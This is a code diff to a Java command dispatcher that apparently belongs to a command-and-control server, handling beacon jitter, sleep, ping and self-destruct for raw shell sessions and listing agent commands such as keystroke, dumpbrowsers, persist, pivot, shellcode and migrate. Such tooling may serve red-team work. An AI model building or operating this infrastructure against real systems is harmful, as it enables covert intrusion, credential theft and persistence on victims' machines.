@@ -38,13 +38,23 @@ public final class AgentCommandDispatcher {
         String   Command  = Parts[0].toLowerCase();
         String   Args     = Parts.length > 1 ? Parts[1].trim() : "";
 
+        if (IsRaw) {
+            switch (Command) {
+                case "jitter" -> { if (!Args.isBlank()) { try { S.SetJitterMs(Long.parseLong(Args.trim())); } catch (NumberFormatException Ignored) {} } Database.SaveCommandLog(SessionId, Operator, UserCommand, "jitter updated server-side: " + Args + "ms", true); return new CommandResult(true, "jitter updated server-side: " + Args + "ms", UserCommand); }
+                case "sleep"  -> { if (!Args.isBlank()) { try { S.SetSleepIntervalMs(Long.parseLong(Args.trim()) * 1000L); } catch (NumberFormatException Ignored) {} } Database.SaveCommandLog(SessionId, Operator, UserCommand, "sleep interval updated server-side: " + Args + "s", true); return new CommandResult(true, "sleep interval updated server-side: " + Args + "s", UserCommand); }
+                case "ping"   -> { CommandResult PingResult = Execute(SessionId, "echo 1"); String PingOut = PingResult.Success() ? "pong" : PingResult.Output(); Database.SaveCommandLog(SessionId, Operator, UserCommand, PingOut, PingResult.Success()); return new CommandResult(PingResult.Success(), PingOut, UserCommand); }
+                case "reconnect" -> { Database.SaveCommandLog(SessionId, Operator, UserCommand, "not supported on raw shell sessions", false); return new CommandResult(false, "[!] 'reconnect' requires a RAVEN protocol agent", UserCommand); }
+                case "self-destruct" -> { CommandResult DestructResult = Execute(SessionId, "exit 0"); Database.SaveCommandLog(SessionId, Operator, UserCommand, DestructResult.Output(), DestructResult.Success()); return DestructResult; }
+            }
+        }
+
         String AgentCmd = IsRaw
                 ? TranslateRaw(Command, Args, IsWindows)
                 : TranslateRaven(Command, Args, IsWindows);
 
         if (AgentCmd == null)
             return new CommandResult(false,
-                    "[!] '" + Command + "' has no valid translation for this target. Use 'exec <id> <raw cmd>' to send commands directly.",
+                    "[!] '" + Command + "' requires a RAVEN protocol agent. Use 'exec <id> <raw cmd>' for direct shell commands.",
                     UserCommand);
 
         CommandResult Result = Execute(SessionId, AgentCmd);
@@ -89,6 +99,9 @@ public final class AgentCommandDispatcher {
     private static String TranslateRaw(String Command, String Args, boolean IsWindows) {
         return switch (Command) {
             case "exec", "shell" -> Args.isBlank() ? null : Args;
+            case "screenshot", "download", "upload", "keystroke", "dumpbrowsers",
+                 "spawn", "persist", "unpersist", "portfwd", "socks", "pivot",
+                 "shellcode", "migrate"                                           -> null;
             default              -> ResolveOsCommand(Command, Args, IsWindows, true);
         };
     }
